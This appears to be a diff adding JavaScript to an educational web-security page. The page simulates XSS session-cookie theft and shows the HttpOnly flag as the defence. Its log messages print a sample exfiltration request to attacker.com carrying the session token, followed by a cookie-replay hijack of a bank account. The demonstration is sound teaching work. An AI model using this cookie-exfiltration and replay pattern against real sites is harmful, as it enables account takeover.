+      log('[server] Set-Cookie: sessionid=' + simToken + '; HttpOnly; Secure', 'log-normal');
+      log('[browser] Cookie stored. Attached to all future requests.', 'log-safe');
+    }
+
+    function stealCookie() {
+      if (!simToken) {
+        clearLog();
+        log('[error] No session exists. Click "Create Session" first.', 'log-warning');
+        return;
+      }
+      var httpOnly = document.getElementById('hsHttpOnly').checked;
+      clearLog();
+      log('[xss] Injected script executing on victim\'s browser...', 'log-warning');
+      log('[xss] Attempting: document.cookie', 'log-warning');
+
+      if (httpOnly) {
+        log('[xss] Result: "" (empty string)', 'log-safe');
+        log('[xss] HttpOnly flag is set — cookie is not accessible to JavaScript.', 'log-safe');
+        log('[defence] Cookie theft BLOCKED. Attacker gets nothing.', 'log-safe');
+      } else {
+        log('[xss] Result: "sessionid=' + simToken + '"', 'log-stolen');
+        log('[xss] Sending to attacker: GET https://attacker.com/steal?c=sessionid=' + simToken, 'log-stolen');
+        log('[attacker] Token received and stored. Ready to use.', 'log-stolen');
+        localStorage.setItem('wsec_stolen_token', simToken);
+      }
+    }
+
+    function useToken() {
+      var stolen = localStorage.getItem('wsec_stolen_token');
+      clearLog();
+      if (!stolen) {
+        log('[attacker] No stolen token available. Fire XSS first (without HttpOnly).', 'log-warning');
+        return;
+      }
+      log('[attacker] Opening bank.example.com in their own browser...', 'log-warning');
+      log('[attacker] Setting cookie manually: sessionid=' + stolen, 'log-warning');
+      log('[attacker] GET /dashboard HTTP/1.1', 'log-warning');
+      log('[attacker] Cookie: sessionid=' + stolen, 'log-warning');
+      log('[server] Token valid. Welcome back, alice.', 'log-stolen');
+      log('[server] Loading /dashboard... FULL ACCESS GRANTED.', 'log-stolen');
+      log('[result] Account hijacked. No password used.', 'log-stolen');
+    }
+
+    function resetSim() {
+      simToken = null;
+      localStorage.removeItem('wsec_sim_session');
+      localStorage.removeItem('wsec_stolen_token');
+      document.getElementById('hsToken').textContent = 'Click "Create Session" to generate a token';
+      clearLog();
+      log('Simulation reset. Ready.', 'log-normal');
+    }
+
+    // ── Init ─────────────────────────────────────────────
+    window.addEventListener('load', function() {
+      buildCookie();
+      clearLog();
+      log('Waiting for action...', 'log-normal');
+
+      try {
+        var v = JSON.parse(localStorage.getItem('wsec_visited') || '[]');
+        if (v.indexOf('2-2') === -1) {
+          v.push('2-2');
+          localStorage.setItem('wsec_visited', JSON.stringify(v));
+        }
+      } catch(e) {}
+    });
+
+  </script>
+</body>
+</html>
